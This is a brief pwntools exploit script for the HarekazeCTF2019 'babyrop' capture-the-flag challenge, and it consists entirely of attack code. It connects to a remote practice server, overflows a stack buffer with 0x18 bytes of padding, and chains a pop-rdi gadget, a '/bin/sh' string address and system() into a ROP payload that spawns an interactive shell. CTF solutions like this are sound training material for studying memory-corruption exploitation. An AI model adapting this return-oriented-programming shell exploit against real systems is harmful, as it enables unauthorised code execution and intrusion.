from pwn import *

pop_rdi_ret = 0x00400683
binsh = 0x00601048
system = 0x00400490

conn = remote('node4.buuoj.cn',28135)
#conn = process('./HarekazeCTF2019_babyrop')

conn.recvuntil(b"What's your name? ")
payload = b'a' * (0x10 + 8)
payload += p64(pop_rdi_ret) + p64(binsh)
payload += p64(system)

conn.sendline(payload)
#conn.recv()
conn.interactive()
